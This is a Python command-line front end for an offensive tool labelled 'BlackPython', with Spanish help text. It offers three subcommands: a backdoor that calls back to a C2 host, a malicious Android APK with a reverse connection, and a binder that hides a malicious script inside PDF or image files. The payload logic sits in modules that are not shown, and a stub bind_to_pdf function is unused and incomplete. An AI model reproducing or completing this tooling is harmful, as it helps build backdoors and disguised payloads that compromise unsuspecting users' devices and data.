from core.backdoor import Backdoor
from core.android import AndroidPayload
from core.binder import FileBinder
import argparse

def bind_to_pdf(original_pdf, payload, output_pdf, ip, port):
    payload = payload.replace("TU_IP_AQUÍ", ip)  # Reemplaza automáticamente

def main():
    parser = argparse.ArgumentParser(description="BlackPython - Herramienta de Red Team")
    subparsers = parser.add_subparsers(dest="command")

    # Backdoor
    backdoor_parser = subparsers.add_parser("backdoor", help="Genera un backdoor")
    backdoor_parser.add_argument("--host", required=True, help="IP o dominio del C2")
    backdoor_parser.add_argument("--port", type=int, default=4444, help="Puerto del C2")

    # Android APK
    android_parser = subparsers.add_parser("android", help="Genera un APK malicioso")
    android_parser.add_argument("--lhost", required=True, help="Host para conexión reversa")
    android_parser.add_argument("--lport", type=int, default=4444, help="Puerto para conexión")

    # Binder
    binder_parser = subparsers.add_parser("bind", help="Camufla un payload en un archivo")
    binder_parser.add_argument("--file", required=True, help="Archivo legítimo (PDF, PNG, JPG)")
    binder_parser.add_argument("--payload", required=True, help="Script malicioso a incrustar")
    binder_parser.add_argument("--output", required=True, help="Archivo de salida")

    args = parser.parse_args()

    if args.command == "backdoor":
        Backdoor(args.host, args.port).run()
    elif args.command == "android":
        AndroidPayload(args.lhost, args.lport).generate_apk()
    elif args.command == "bind":
        if args.file.endswith(".pdf"):
            FileBinder.bind_to_pdf(args.file, open(args.payload).read(), args.output)
        elif args.file.endswith((".png", ".jpg")):
            FileBinder.bind_to_image(args.file, open(args.payload).read(), args.output)

if __name__ == "__main__":
    main()
